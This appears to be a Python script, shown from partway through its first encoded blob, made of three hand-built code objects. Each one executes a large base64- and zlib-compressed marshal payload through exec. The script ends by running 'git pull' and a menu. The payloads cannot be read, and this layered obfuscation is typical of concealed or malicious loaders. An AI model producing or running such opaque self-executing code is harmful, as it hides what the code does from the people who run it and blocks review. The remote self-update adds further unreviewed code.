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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
    
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'T.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()

if __name__=="__main__":
	os.system("git pull")
	menu()
































































